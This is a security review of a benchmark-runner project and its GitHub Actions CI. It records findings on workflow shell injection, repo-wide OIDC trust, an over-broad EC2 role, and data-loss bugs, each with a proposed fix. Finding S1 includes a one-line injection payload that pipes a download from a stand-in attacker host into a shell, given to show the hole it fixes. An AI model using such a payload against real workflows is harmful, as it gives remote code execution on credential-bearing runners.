# benchmark-runner — review findings

Static review of `benchmark-runner` and the CI path that drives it, recorded 2026-07-30 so the
walkthrough can resume in a fresh session. Companion file:
[`baas-cli-findings.md`](./baas-cli-findings.md).

**Line numbers are as of the commit that added this file and will drift.** Each entry names a
logical anchor (file, method, workflow step) — trust that over the line number.

## Scope of this bucket

GitHub Actions workflows and `cf-template-ci.yaml` are here rather than in the baas-cli file: per
CLAUDE.md, `baas` neither dispatches nor depends on the workflows, which exist to drive
`benchmark-runner.jar`. If CI later deserves its own track, S1/S2/S3/A10/S10/S12 move out together.

## Deliberately excluded

Everything in CLAUDE.md's *Accepted risks* table was skipped and should not be re-raised as a bug —
in particular runner-JAR checksum verification and the shared `RunnerRole`.

## Status

The walkthrough started with baas-cli at the user's request. Nothing here has been fixed *by the
walkthrough*; A4 was partly addressed as a side effect of `dynamodb-results-store`.

| # | ID | Finding | Sev | Status |
|---|-----|---------|-----|--------|
| 1 | S1 | Shell injection via `${{ inputs.parameters }}` on a self-hosted runner | High | Open |
| 2 | S2 | OIDC `sub: repo:org/repo:*` + `on: pull_request` + self-hosted runner | High | Open |
| 3 | S3 | `WorkflowRole` `RunInstances` on `*`, no type or region conditions | High | Open |
| 4 | A1 | Four copy-pasted services diverged — only jmh uploads `logs/*.log` | Med | Open |
| 5 | A2 | Unbounded log walk; no `visitFileFailed`; filename collisions | Med | Open |
| 6 | A4 | S3 upload before store write — transient error discards paid results | Med | **Partly addressed** |
| 7 | A10 | CI hardcodes `baas-lynx-main`, unreachable by the prefix scheme | Low | Open |
| 8 | D3 | `ASYNC_PATH` unset in PR CI → async test silently skipped | Low | Open |
| 9 | S10 | Third-party actions on mutable tags; dependabot lacks `github-actions` | Low | Open |
| 10 | S12 | `GHA_EC2_PAT` is a classic PAT with `repo` scope | Low | Open |

---

## 1. S1 — shell injection via workflow inputs · High

`.github/workflows/exec-single-benchmark.yml` (~lines 92-116) interpolates
`${{ inputs.parameters }}`, `${{ inputs.runner-path }}` and `${{ inputs.benchmark-path }}` directly
into `run:` blocks. `benchmark-runner.yml` exposes these via `workflow_dispatch`, so anyone who can
dispatch it gets arbitrary shell on an EC2 self-hosted runner carrying an instance profile.
`parameters: "; curl attacker|sh #"` is the whole exploit.

**Proposed fix:** bind each input to `env:` and reference `"$PARAMETERS"` inside the script —
GitHub's documented hardening for exactly this. Mechanical, no behaviour change.

## 2. S2 — OIDC trust is repo-wide and PRs trigger it · High

`infra/cf-template-ci.yaml` (~lines 70-73) pins `token.actions.githubusercontent.com:sub` to
`repo:${Org}/${Repo}:*`. The wildcard accepts every ref, every PR branch and every tag.
`e2e-cloud-test.yml` line 5 (`on: pull_request`) then starts a **self-hosted** runner via
`machulav/ec2-github-runner`. Fork PRs cannot reach secrets, so this is not anonymous — but it
turns "can open a PR from a repo branch" into "holds AWS credentials".

**Proposed fix:** pin `sub` to `repo:org/repo:ref:refs/heads/main` plus a
`repo:org/repo:environment:<name>` entry; put the E2E job behind an environment with required
reviewers; replace the bare `pull_request` trigger with `workflow_dispatch` or a label gate.

GitHub explicitly warns against self-hosted runners on public-repo PRs — check the repo's
visibility when picking severity.

## 3. S3 — the CI role is more powerful than the human one · High

`cf-template-ci.yaml` (~lines 79-86) grants `ec2:RunInstances` on `Resource: "*"` with **no**
`ec2:InstanceType` and **no** `aws:RequestedRegion` condition. `OperatorRole` in
`cf-template-core.yaml` restricts both, with a comment explaining why the statement had to be
split. The careful thinking went into the human path, not the automated one — backwards, since CI
is what an attacker reaches first. A cost bomb or miner is a one-line workflow edit away.

**Proposed fix:** copy the two-statement split and both conditions from `OperatorRole`. Also note
`ec2:AssociateIamInstanceProfile`/`ReplaceIamInstanceProfileAssociation` on `Resource: "*"` — bounded
by `iam:PassRole` to the runner role, but it can still attach that profile to unrelated instances.

## 4. A1 — four copy-pasted services, already diverged · Med

`services/JmhSubcommandService`, `JmhWithProfilerSubcommandService`,
`JmhWithAsyncProfilerSubcommandService` and `JCStressSubcommandService` share a structure with
per-type deltas, plus four near-identical `*Builder` classes. Diffing the first two is almost
entirely import noise — except that **only `JmhSubcommandService` uploads `logs/*.log`**:

```
JCStressSubcommandService.java               walkFileTree=0
JmhSubcommandService.java                    walkFileTree=1
JmhWithAsyncProfilerSubcommandService.java   walkFileTree=0
JmhWithProfilerSubcommandService.java        walkFileTree=0
```

So three of four benchmark types silently ship no log files while CLAUDE.md's S3-layout table
presents `logs/*.log` as general. Predictable outcome of the five-touch-point extension pattern
(subcommand + service + builder + options record + `TestWrapper` registration), none of it
enforced.

**Proposed fix:** a template method (`prepare/execute/collect/persist` with per-type hooks) so the
shared 80% lives once and a missing step is a compile error rather than a missing S3 prefix.
Highest-value item in this file — the divergence is already losing data.

## 5. A2 — the `/app` invariant is enforced in the wrong module · Med

`JmhSubcommandService.executeCommand()` (~line 53) walks `Paths.get(".")` unbounded, and the guard
against that walking all of `/` lives in a shell script in a *different Maven module*
(`UserDataScriptBuilder`'s `cd /app`). Three defects underneath:

- no `visitFileFailed` override, so a file vanishing mid-walk aborts the whole upload — exactly the
  documented `/proc` failure
- no depth limit
- the destination key uses `file.getFileName()`, so `a/run.log` and `b/run.log` silently overwrite
  each other in S3

**Proposed fix:** an explicit `--log-scan-root` with a depth cap and a `CONTINUE`-returning
`visitFileFailed`. The CLI-side invariant then becomes a convenience rather than load-bearing.
Fix together with A1 — same code path.

## 6. A4 — the expensive artifact is persisted last · Med · **Partly addressed**

`JmhSubcommandService.executeCommand()` uploads process output and logs to S3 *before* writing
measurements to Mongo, so a transient S3 error throws away the result of a benchmark that just cost
real instance-hours.

**Proposed fix:** persist measurements first, then upload logs best-effort inside a try/catch that
logs and continues.

Related, smaller: `DocumentDbService.save` uses `insert`, so re-running with the same `requestId`
fails on duplicate key rather than upserting; and results are saved one at a time with no batching
or transaction, so a mid-loop failure leaves a partial set.

**Partly addressed** by `dynamodb-results-store` — the two "related, smaller" points are closed,
the main ordering point is not, and was deliberately decided the other way:

- **Idempotent, not duplicate-key-failing.** `insert` is gone. Every write is a `PutItem` keyed on
  `(pk, sk)` derived from the measurement, so re-running the same `requestId` overwrites. Covered
  by an integration test asserting a repeated write leaves the item count unchanged.
- **Batched, not one at a time.** The DynamoDB adapter writes a run's measurements in batches and
  retries unprocessed items with backoff. A write that ultimately fails exits non-zero rather than
  leaving a silent partial set.
- **S3 still goes first, on purpose.** All four subcommand services now order S3-then-store
  explicitly. The reasoning inverted once the verbatim result JSON existed: the stored item points
  at `resultJsonKey`, so writing the item first could publish a row referencing an object that was
  never uploaded. S3 artifacts surviving a failed store write is recoverable — the same run's data
  is still in the bucket, and the migration path can re-derive from it; a dangling key is not. An
  integration test asserts exactly that: a store failure exits non-zero **and** leaves the S3
  artifacts intact.

So the paid-result-discarded risk is reduced rather than removed: a store failure still loses the
measurement row, but no longer loses the artifacts, and no longer half-writes a run.

## 7. A10 — CI and CLI disagree on naming · Low

`e2e-cloud-test.yml` line 8 hardcodes `S3_BUCKET: baas-lynx-main`, which the ARN-hash prefix scheme
in `SetupCommand.computePrefix` can never generate. CI depends on a hand-built stack that
`baas admin setup` cannot reproduce.

## 8. D3 — PR CI silently skips the async test · Low

`ci-pr-build.yml` runs `mvn -B clean verify` without `ASYNC_PATH`, so
`JmhWithAsyncProfilerSubcommandServiceIT` — annotated
`@EnabledIfEnvironmentVariable(named = "ASYNC_PATH", ...)` — never runs. Already documented as a
trap in CLAUDE.md, still unfixed in the one place it matters.

**Proposed fix:** set `ASYNC_PATH` in the workflow, or make the test fail loudly when the variable
is absent on CI.

## 9. S10 — supply chain · Low

Third-party actions are pinned to mutable tags (`machulav/ec2-github-runner@v2`), and
`.github/dependabot.yml` covers only `maven` — so no action ever gets an update PR.

**Proposed fix:** add the `github-actions` ecosystem to dependabot; SHA-pin third-party actions.

## 10. S12 — `GHA_EC2_PAT` · Low

A classic PAT with `repo` scope, used by `machulav/ec2-github-runner` in `start-ec2-runner.yml` and
`stop-ec2-runner.yml`. A fine-grained PAT or a GitHub App narrows the blast radius.

---

## What is genuinely well done

Worth protecting while changing the rest, and worth not "simplifying" away:

- **`OperatorPolicyDriftTest`** compares actions *and* canonicalized resources/conditions between
  `operator-policy.json` and the CloudFormation role, with a comment explaining why actions alone
  are insufficient.
- **The three-layer termination design**, with the watchdog started before anything can fail and
  the `no set -e` decision written down with its reasoning.
- **IMDSv2 required with `httpPutResponseHopLimit(1)`** in `Ec2ProvisioningService`.
- **The Mongo URI never enters user-data** — fetched from SSM at runtime with a narrow resource.
- **The bucket**: versioning, SSE, full public-access block, and a lifecycle policy that even
  handles orphaned delete markers.
- **Comments explain *why*.** That is what made this review possible at all.
